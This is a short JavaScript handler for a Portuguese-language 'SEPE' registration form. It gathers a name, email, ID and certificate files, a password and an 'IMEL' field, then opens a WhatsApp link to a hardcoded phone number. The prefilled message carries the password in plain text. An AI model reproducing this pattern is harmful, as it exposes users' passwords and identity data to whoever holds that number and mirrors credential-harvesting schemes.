document.getElementById("form-cadastro").addEventListener("submit", function(event) {
  event.preventDefault(); // Impede o envio padrão do formulário

  // Obter os valores dos campos do formulário
  const nome = document.getElementById("nome").value;
  const email = document.getElementById("email").value;
  const bi = document.getElementById("bi").files[0];
  const certificado = document.getElementById("certificado").files[0];
  const senha = document.getElementById("senha").value;
  const imel = document.getElementById("imel") ? document.getElementById("imel").value : '';

  // Verificação básica de preenchimento
  if (!nome || !email || !bi || !certificado || !senha || !imel) {
    alert("Por favor, preencha todos os campos.");
    return;
  }

  // Criar a mensagem para o WhatsApp
  const mensagem = `Olá! Eu gostaria de me cadastrar no SEPE.\n
Nome: ${nome}
Email: ${email}
Nome do arquivo BI: ${bi.name}
Nome do arquivo Certificado: ${certificado.name}
Senha: ${senha}
IMEL: ${imel}`;

  // Número de destino no WhatsApp (formato internacional, sem "+" ou espaços)
  const numeroWhatsApp = "244937435613"; // Substitui pelo número correto

  // Montar o link do WhatsApp com a mensagem
  const linkWhatsApp = `https://wa.me/${numeroWhatsApp}?text=${encodeURIComponent(mensagem)}`;

  // Abre o WhatsApp Web ou App com a mensagem pronta
  window.open(linkWhatsApp, '_blank');

  // Limpa o formulário
  document.getElementById("form-cadastro").reset();
});
